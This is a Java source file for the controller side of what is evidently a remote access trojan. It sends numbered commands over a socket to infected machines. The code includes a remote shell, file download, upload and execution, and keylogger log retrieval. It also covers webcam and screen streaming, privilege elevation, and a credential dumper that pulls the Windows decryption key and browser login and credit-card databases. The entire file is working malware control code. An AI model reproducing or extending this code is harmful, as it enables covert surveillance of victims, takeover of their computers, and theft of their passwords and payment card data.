package Connections;


import GUI.TableUtils.Connection.ConnectionEnum;
import GUI.TableUtils.Credentials.CredentialsDumper;
import GUI.TableUtils.Credentials.Packets.CombinedCredentials;
import GUI.TableUtils.KeyLogger.KeyloggerEvents;
import GUI.TableUtils.Permissions.Permissions;
import GUI.TableUtils.ReverseShell.Shell;
import GUI.TableUtils.ScreenStreaming.Screen;
import GUI.TableUtils.SystemState.State;
import Information.*;


import Information.Action;
import org.json.JSONObject;


import javax.swing.*;
import java.io.*;
import java.net.Socket;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class Streams {

    private final DataInputStream dis;
    private final DataOutputStream dos;
    private SystemInformation tempSystemInformation;
    private NetworkInformation tempNetworkInformation;
    private boolean webcamDialogOpen;

    private final Socket clientSocket;

    private Streams mainStream;

    private final ExecutorService executor = Executors.newSingleThreadExecutor();

    public Streams(Socket socket) throws IOException {
        if (socket == null) throw new IllegalArgumentException();
        clientSocket = socket;
        InputStream is = socket.getInputStream();
        OutputStream os = socket.getOutputStream();
        dis = new DataInputStream(is);
        dos = new DataOutputStream(os);
        mainStream = this;
    }

    public byte[] receiveBytes() throws IOException {
        int fileSize = readSize();
        int total = 0;
        byte[] buffer = new byte[fileSize];
        // System.out.println("buffer size -> " + buffer.length);
        try {
            while (total < fileSize) {
                int read = dis.read(buffer, total, fileSize - total);
                total += read;
            }
            //System.out.println("REAL TOTAL -> " + total);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }

//        System.out.println(total);

        return buffer;
    }

    @SuppressWarnings("ResultOfMethodCallIgnored")
    public String receiveFile(String path) throws IOException {
        String fileName = readString();
        File filePath = new File(path + "\\" + fileName);
        filePath.getParentFile().mkdirs();

        boolean resultOfCreation = filePath.createNewFile();

        System.out.println(resultOfCreation);
        System.out.println("Name " + filePath);

        sendSize(-70);
        int fileSize = readSize();
        int read;
        int total = 0;
        byte[] buffer = new byte[1024];
        FileOutputStream fos;

        fos = new FileOutputStream(filePath);

        BufferedOutputStream bos = new BufferedOutputStream(fos);
        while (total < fileSize) {
            try {
                read = dis.read(buffer);
                total += read;
                bos.write(buffer, 0, read);
            } catch (IOException e) {
                throw new RuntimeException(e);
            }

            System.out.println(total);
        }

        bos.flush();
        bos.close();


        System.out.println("File "
                + " downloaded (" + total + " bytes read)");
        return filePath.toString();

    }


    private SystemInformation listToSystemInformation(List<String> list) {
        return new SystemInformation(list.get(0), list.get(1), list.get(2), list.get(3),
                list.get(4), list.get(5), list.get(6), Boolean.parseBoolean(list.get(7)), Boolean.parseBoolean(list.get(8)));
    }

    private NetworkInformation listToNetworkInformation(String jsonString) {
        JSONObject jsonObject = new JSONObject(jsonString);
        return new NetworkInformation(
                jsonObject.get("query").toString(),
                jsonObject.get("isp").toString(),
                jsonObject.get("continent").toString(),
                jsonObject.get("country").toString(),
                jsonObject.get("regionName").toString(),
                jsonObject.get("city").toString(),
                jsonObject.get("timezone").toString(),
                jsonObject.get("currency").toString(),
                jsonObject.getBoolean("proxy")
        );
    }

    public Object sendAction(Action action) throws IOException {
        JSONObject object = new JSONObject();
        switch (action) {
            case SYS_INFO -> {
                object.put("action", 0);
                sendString(object.toString());
                //sendSize(0);
                List<String> informationList = readList();
                return listToSystemInformation(informationList);
            }
            case NET_INFO -> {
                object.put("action", 1);
                sendString(object.toString());
                String networkJSON = readString();
                return listToNetworkInformation(networkJSON);
            }
            case DISK -> {
                object.put("action", 2);
                mainStream.sendString(object.toString());
                List<String> listOfDisks = readList();
                System.out.println(listOfDisks);
                return listOfDisks.toArray(new String[0]);
            }
            case REQUEST_WEBCAM -> {
                object.put("action", 16);
                System.out.println("sended");
                mainStream.sendString(object.toString());
                return readList();
            }


        }
        return null;
    }

    public byte[] receiveBytesForCryptography() throws IOException {
        int size = readSize();
        byte[] buffer = new byte[size];
        dis.readFully(buffer);
        return buffer;
    }





    public void sendAction(Action action, String destinationPath, int numOfFiles) throws IOException {
        JSONObject jsonObject = new JSONObject();
        if (action == Action.UPLOAD) {
            jsonObject.put("action", 10);
            jsonObject.put("path", destinationPath);
            jsonObject.put("num_of_files", numOfFiles);
            mainStream.sendString(jsonObject.toString());
        }
    }

    public void sendAction(Action action, List<String> fileList, List<String> directoryList) throws IOException {
        JSONObject jsonObject = new JSONObject();
        if (action == Action.COPY) {
            jsonObject.put("action", 6);
            jsonObject.put("file_list", fileList);
            jsonObject.put("directory_list", directoryList);
            mainStream.sendString(jsonObject.toString());
        }
    }

    public void sendAction(Action action, List<String> fileList, String directory) throws IOException {
        JSONObject jsonObject = new JSONObject();
        if (action == Action.MOVE) {
            jsonObject.put("action", 7);
            jsonObject.put("file_list", fileList);
            jsonObject.put("path", directory);
            mainStream.sendString(jsonObject.toString());
        }
    }

    public List<String> sendAndReadAction(Action action, String name) throws IOException {
        JSONObject object = new JSONObject();
        if (action == Action.R_A_DIR) {
            object.put("action", 3);
            object.put("path", name);
            mainStream.sendString(object.toString());
            return new ArrayList<>(Arrays.asList(readString().split("\\|")));
        }
        return null;
    }

    public String sendAndReadAction(Shell action, String command) throws IOException {
        JSONObject jsonObject = new JSONObject();
        if (action == Shell.COMMAND) {
            jsonObject.put("action", 11);
            jsonObject.put("command", command);
            mainStream.sendString(jsonObject.toString());
            return readString();
        }
        return null;
    }

    public CombinedCredentials getCredentials(Action action, String dbPath) throws IOException {
        JSONObject jsonObject = new JSONObject();
        switch (action) {
            case DUMP_CREDENTIALS -> {
                jsonObject.put("action", 15);
                mainStream.sendString(jsonObject.toString());
                byte[] decryptedWINKey = receiveBytesForCryptography();
                String accountsDB = receiveFile(dbPath);
                String creditCardsDB = receiveFile(dbPath);
                CredentialsDumper credentialsDumper = new CredentialsDumper(decryptedWINKey, accountsDB, creditCardsDB);
                return credentialsDumper.getCredentials();
            }
        }
        return null;
    }
    public void sendAction(Action action, String command) throws IOException {
        JSONObject jsonObject = new JSONObject();
        switch (action) {
            case KEYBOARD_COMMAND -> {
                jsonObject.put("action", 18);
                jsonObject.put("command", command);
                mainStream.sendString(jsonObject.toString());
            }
            case BOX_MESSAGE -> {
                jsonObject.put("action", 21);
                jsonObject.put("command", command);
                mainStream.sendString(jsonObject.toString());
            }

        }
    }

    public Object sendAndReadAction(Action action, String selectedDevice, boolean fragmented, int fps) throws IOException {
        JSONObject jsonObject = new JSONObject();
        if (action == Action.START_WEBCAM) {
            jsonObject.put("action", 17);
            jsonObject.put("selected_device", selectedDevice);
            jsonObject.put("is_fragmented", fragmented);
            jsonObject.put("fps", fps);
            mainStream.sendString(jsonObject.toString());
            return new int[]{readSize(), readSize()};
        }
        return null;
    }


    public void sendAction(Action action, List<String> fileList) throws IOException {
        JSONObject jsonObject = new JSONObject();
        switch (action) {
            case DOWNLOAD -> {
                jsonObject.put("action", 5);
                jsonObject.put("file_list", fileList);
                mainStream.sendString(jsonObject.toString());
            }
            case DELETE -> {
                jsonObject.put("action", 8);
                jsonObject.put("file_list", fileList);
                mainStream.sendString(jsonObject.toString());
            }
            case RUN -> {
                jsonObject.put("action", 9);
                jsonObject.put("file_list", fileList);
                mainStream.sendString(jsonObject.toString());
            }
        }
    }

    public void sendAction(KeyloggerEvents event, String nameOfSession) throws IOException {
        JSONObject jsonObject = new JSONObject();
        switch (event) {
            case DUMP_LAST -> {
                jsonObject.put("action", 4);
                mainStream.sendString(jsonObject.toString());
                if (readSize() != -1) {
                    receiveFile(nameOfSession);
                    FolderOpener.open(nameOfSession);
                } else {
                    noLogsToDownload();
                }
            }
            case DUMP_ALL -> {
                jsonObject.put("action", 14);
                mainStream.sendString(jsonObject.toString());
                if (readSize() != -1) {
                    receiveLogs(nameOfSession);
                    FolderOpener.open(nameOfSession);
                } else {
                    noLogsToDownload();
                }
            }
        }
    }

    private void noLogsToDownload() {
        SwingUtilities.invokeLater(() -> JOptionPane.showMessageDialog(null, "There are no logs to download!",
                "Keylogger error", JOptionPane.ERROR_MESSAGE));
    }

    private void receiveLogs(String nameOfSession) throws IOException {
        while (readSize() != -1) {
            receiveFile(nameOfSession);
            sendSize(0);
        }
    }

    public int sendAndReadAction(Permissions permissions) throws IOException {
        JSONObject object = new JSONObject();
        switch (permissions) {
            case ELEVATE_PRIVILEGES -> {
                object.put("action", 20);
                mainStream.sendString(object.toString());
                return readSize();
            }

        }
        return 0;
    }

    public void sendAction(Screen action) throws IOException {
        JSONObject jsonObject = new JSONObject();
        if (action == Screen.STREAM) {
            jsonObject.put("action", 22);
            mainStream.sendString(jsonObject.toString());
        }
    }


    public void sendAction(ConnectionEnum action) throws IOException {
        switch (action) {
            case RESTART -> sendSize(-1);
            case DISCONNECT -> sendSize(-2);
            case UNINSTALL -> sendSize(-3);
        }
    }

    public void stateAction(State state) throws IOException {
        switch (state) {
            case LOG_OFF -> sendSize(23);
            case SHUTDOWN -> sendSize(24);
            case REBOOT -> sendSize(25);
        }
    }


    public void sendList(List<String> fileList) throws IOException {
        String convertedListWithSeparator = String.join("|", fileList);
        sendString(convertedListWithSeparator);

    }

    public List<String> readList() throws IOException {
        String stringList = readString();
        return new ArrayList<>(Arrays.asList(stringList.split("\\|")));
    }

    public void sendSize(int size) throws IOException {
        dos.writeInt(size);
    }

    public void sendString(String message) throws IOException {
        byte[] buffer = message.getBytes();
        sendSize(buffer.length);
        dos.write(buffer);
    }

    public int readSize() throws IOException {
        return dis.readInt();
    }

    public String readString() throws IOException {
        int size = readSize();
        byte[] buffer = new byte[size];
        int read = 0;
        while (read < size) {
            read += dis.read(buffer, 0, size);
        }
        return new String(buffer);
    }

    public Socket getClientSocket() {
        return clientSocket;
    }

    public String getSessionFolder() {
        return "Session - " + getIdentifier();
    }

    public String getIdentifier() {
        return tempNetworkInformation.IP() + " - " + tempSystemInformation.USER_NAME();
    }

    public SystemInformation getTempSystemInformation() {
        return tempSystemInformation;
    }

    public void setTempSystemInformation(SystemInformation tempSystemInformation) {
        this.tempSystemInformation = tempSystemInformation;
    }

    public NetworkInformation getTempNetworkInformation() {
        return tempNetworkInformation;
    }

    public void setTempNetworkInformation(NetworkInformation tempNetworkInformation) {
        this.tempNetworkInformation = tempNetworkInformation;
    }

    public boolean isWebcamDialogOpen() {
        return !webcamDialogOpen;
    }

    public void setWebcamDialogOpen(boolean webcamDialogOpen) {
        this.webcamDialogOpen = webcamDialogOpen;
    }

    public ExecutorService getExecutor() {
        return executor;
    }

    public DataOutputStream getDos() {
        return dos;
    }

    public DataInputStream getDis() {
        return dis;
    }


    public void setMainStream(Streams mainStream) {
        this.mainStream = mainStream;
    }
}